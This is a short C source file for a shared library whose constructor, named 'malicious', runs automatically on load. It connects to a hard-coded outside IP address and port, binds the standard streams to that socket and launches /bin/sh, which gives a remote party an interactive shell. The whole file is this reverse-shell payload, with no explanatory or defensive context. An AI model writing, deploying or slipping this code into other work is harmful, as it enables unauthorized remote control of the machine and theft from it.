#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

//This allows it to run immediately when a shared library is loaded
//during program startup 

static int malicious() __attribute__((constructor));

#define REMOTE_ADDR "13.211.86.48"
#define REMOTE_PORT 9447

int malicious() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("13.211.86.48");
    sa.sin_port = htons(9447);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
